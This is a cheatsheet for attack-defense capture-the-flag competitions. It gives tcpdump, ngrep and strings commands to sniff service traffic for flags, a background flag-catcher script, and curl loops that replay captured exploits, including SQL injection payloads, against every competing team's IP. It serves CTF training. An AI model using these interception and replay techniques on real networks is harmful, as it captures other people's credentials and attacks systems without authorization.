# Network Interception & Flag Stealing Cheatsheet

---

## The Core Idea

In attack-defense, the **checker bot** visits every team's services and submits/retrieves flags. Other teams' **exploit scripts** also hit your service. If you can sniff that traffic, you can:
- **Steal flags** from packets in transit (checker retrieving flag = flag visible in plaintext)
- **Copy working exploits** from enemy teams hitting your service
- **Replay those exploits** against other teams immediately

---

## Tool 1 — tcpdump (Almost Always Available)

```bash
# Capture everything on all interfaces
tcpdump -i any -A -s 0

# Capture on specific interface
tcpdump -i eth0 -A -s 0

# Capture specific port (your service port)
tcpdump -i any port 8080 -A -s 0

# Capture all service ports at once
tcpdump -i any port 8080 or port 5000 or port 3000 or port 9000 -A -s 0

# Save to file for analysis
tcpdump -i any -w /tmp/capture.pcap

# Read saved file
tcpdump -r /tmp/capture.pcap -A

# Filter by source IP (enemy team)
tcpdump -i any src 10.10.2.1 -A -s 0

# Show only HTTP content (grep out noise)
tcpdump -i any port 80 -A -s 0 | grep -E "GET|POST|flag|FLAG|CTF|Authorization"
```

---

## Tool 2 — Grep Flag Format in Real Time

```bash
# Pipe tcpdump directly into grep for flag format
# Adjust flag regex to your competition format

tcpdump -i any -A -s 0 2>/dev/null | grep -E "FLAG\{[^}]+\}|CTF\{[^}]+\}|flag\{[^}]+\}"

# More aggressive — catch partial flags too
tcpdump -i any -A -s 0 2>/dev/null | grep -oE "[A-Z0-9_]{20,}"

# Watch all service ports and filter flags
tcpdump -i any -A -s 0 port 8080 or port 5000 or port 3000 2>/dev/null \
  | grep --line-buffered -E "FLAG|flag|CTF|token|secret|auth"
```

---

## Tool 3 — strings on Live Traffic

```bash
# If traffic is binary/encoded
tcpdump -i any -w - 2>/dev/null | strings | grep -E "FLAG|CTF|flag{"

# From saved pcap
strings /tmp/capture.pcap | grep -E "FLAG\{|CTF\{|flag\{"
```

---

## Capture & Steal Exploit Requests

```bash
# When enemy hits your service, capture their full HTTP request
# This gives you their working exploit — replay it on other teams

tcpdump -i any port 8080 -A -s 0 2>/dev/null | tee /tmp/traffic.log

# Then read it
cat /tmp/traffic.log | grep -A 20 "POST\|GET"

# Extract full requests
tcpdump -i any port 8080 -A -s 0 2>/dev/null \
  | grep -E "^(GET|POST|PUT|DELETE|HEAD|OPTIONS)" -A 30
```

---

## Continuous Flag Catcher Script

```bash
#!/bin/bash
# Save as ~/flag_catcher.sh
# Adjust FLAG_REGEX to your competition format

FLAG_REGEX="FLAG\{[^}]+\}"
PORTS="port 8080 or port 5000 or port 3000 or port 9000 or port 80"
OUTFILE=~/caught_flags.txt

echo "Starting flag catcher on: $PORTS"
echo "Output: $OUTFILE"

tcpdump -i any $PORTS -A -s 0 2>/dev/null \
  | grep --line-buffered -oE "$FLAG_REGEX" \
  | while read flag; do
      ts=$(date '+%H:%M:%S')
      echo "[$ts] CAUGHT: $flag"
      echo "[$ts] $flag" >> $OUTFILE
    done
```

```bash
chmod +x ~/flag_catcher.sh
bash ~/flag_catcher.sh &
```

---

## Capture Full HTTP Exchanges (Request + Response)

```bash
# Use tcpdump with ascii output — shows full HTTP
tcpdump -i any -A -s 65535 port 8080 2>/dev/null | \
  awk '/GET|POST|HTTP/{found=1} found{print; if(/^\r?$/ && prev~/^\r?$/) found=0} {prev=$0}'

# Alternative — ngrep if available
ngrep -d any -q "." port 8080

# Capture and immediately show readable output
tcpdump -i any port 8080 -l -A 2>/dev/null | \
  grep -v "^[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]" | \
  grep -v "^$" | \
  grep -v "^[\.E@]"
```

---

## Replay Captured Exploits

```bash
# Enemy hits your service with a working exploit
# You capture the raw request — now replay it on their IP

# If you captured a GET request:
# GET /vulnerable?id=1 UNION SELECT flag FROM flags-- HTTP/1.1
# Host: your_ip

# Replay on enemy:
curl "http://10.10.2.1:8080/vulnerable?id=1 UNION SELECT flag FROM flags--"

# If you captured a POST:
curl -X POST http://10.10.2.1:8080/login \
  -d "username=admin'--&password=anything"

# Script to hit all enemy teams with the same exploit
for ip in 10.10.2.1 10.10.3.1 10.10.4.1 10.10.5.1; do
  echo "=== Hitting $ip ==="
  curl -s "http://$ip:8080/vulnerable?payload=CAPTURED_PAYLOAD" \
    | grep -oE "FLAG\{[^}]+\}"
done
```

---

## Capture Inside Docker Containers

```bash
# If services run in containers, sniff from host on the docker bridge
ip a | grep docker          # find docker bridge IP e.g. 172.17.0.1
tcpdump -i docker0 -A -s 0 2>/dev/null | grep -E "FLAG|flag|CTF"

# Or enter the container and sniff from inside
docker exec -it <container_id> sh -c "
  # try tcpdump inside
  tcpdump -i any -A -s 0 2>/dev/null | grep -E 'FLAG|flag'
"

# Sniff traffic between container and outside
tcpdump -i any host 172.17.0.2 -A -s 0 2>/dev/null
```

---

## Read pcap Files Offline

```bash
# Save a capture for 60 seconds then analyze
timeout 60 tcpdump -i any -w /tmp/cap.pcap 2>/dev/null

# Extract all strings
strings /tmp/cap.pcap

# Grep flags
strings /tmp/cap.pcap | grep -oE "FLAG\{[^}]+\}"

# Show all HTTP requests captured
strings /tmp/cap.pcap | grep -E "^(GET|POST|HTTP)"

# Show all form data (POST bodies)
strings /tmp/cap.pcap | grep -E "username=|password=|id=|token=|cmd="
```

---

## One-Liner Reference Card

```bash
# Catch flags live on all ports
tcpdump -i any -A -s0 2>/dev/null | grep -oE "FLAG\{[^}]+\}"

# Watch enemy exploits hitting your service
tcpdump -i any port 8080 -A -s0 2>/dev/null | grep -E "GET|POST|cmd=|id=|../|UNION|eval"

# Capture and save everything for 5 minutes
timeout 300 tcpdump -i any -w /tmp/full.pcap 2>/dev/null &

# Hit all teams with captured exploit
for i in $(seq 1 20); do
  curl -s "http://10.10.$i.1:8080/EXPLOIT" | grep -oE "FLAG\{[^}]+\}"
done

# Watch docker bridge traffic
tcpdump -i docker0 -A -s0 2>/dev/null | grep -oE "FLAG\{[^}]+\}"
```

---

## What to Look For in Traffic

| Pattern | What It Means |
|--------|--------------|
| `FLAG{...}` in response | Checker retrieving flag — you have it |
| `POST /login` with weird chars | SQLi auth bypass attempt |
| `GET /?file=../../` | Path traversal attempt |
| `GET /?cmd=` or `?exec=` | CMDi attempt |
| `Content-Type: application/x-www-form-urlencoded` with long body | Possible exploit payload |
| `UNION SELECT` in any param | SQLi — copy and replay |
| Base64 strings in params | Encoded payload — decode and analyze |
| Repeated requests from same IP | Automated exploit script — capture the pattern |
